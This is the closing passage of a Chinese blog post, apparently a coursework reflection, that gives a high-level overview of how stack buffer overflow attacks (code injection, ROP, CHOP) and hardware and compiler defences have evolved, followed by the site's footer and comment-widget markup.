传统的缓冲区溢出攻击主要集中在利用简单的内存溢出和代码注入技术，攻击者通过构造特定的数据溢出，突破系统的基本防护措施，实现任意代码执行。面对这些攻击，最初的防御手段也相对单一，主要依赖操作系统级的内存保护和简单的补丁修复。尽管这些措施在一定程度上限制了攻击者的手段，但仍无法彻底消除漏洞。
随着攻击技术的不断发展，攻击者不再满足于简单的利用方式，而是开始运用更复杂的技术，如利用各类攻击链（如上述的CHOP）、动态生成ROP链条以及针对特定平台（例如物联网和专用硬件平台）的新型攻击手法。这种多样化的攻击方式使得传统的防护手段逐渐显示出局限性，需要从根本上升级防御策略。
在防御领域，研究者逐步从单纯的软件补救措施转向硬件与软件相结合的综合防护机制。硬件层面的防御方法，如利用硬件控制流保护与指针认证机制，显著降低了攻击成功率；同时，控制流完整性检查和编译器辅助的防御技术不断完善，通过在代码编译和运行时对潜在的利用点进行分析与约束，进一步提高了系统的整体安全性。这种多层次的防护体系有效平衡了性能和安全性，构成了应对新型攻击挑战的重要屏障。
这次的作业备使我充分认识到，栈溢出的攻击和防御对抗发展迅速。攻击手法从传统的单一模式逐步演变为更复杂、更自动化的多平台利用，而防御技术也在不断从单点防护向系统级综合防御转变。</p></section><footer class=article-footer><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/fuzz101_1/><div class=article-image><img src=/p/fuzz101_1/Pastedimage20250419184614.51ae01b1c46b9023f0c0f968d8f77a9b_hu_c42536a9b94d1c3c.png width=250 height=150 loading=lazy alt="Featured image of post Fuzz101_1" data-hash="md5-Ua4BscRrkCPwwPlo2Pd6mw=="></div><div class=article-details><h2 class=article-title>Fuzz101_1</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2025 Example Person</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>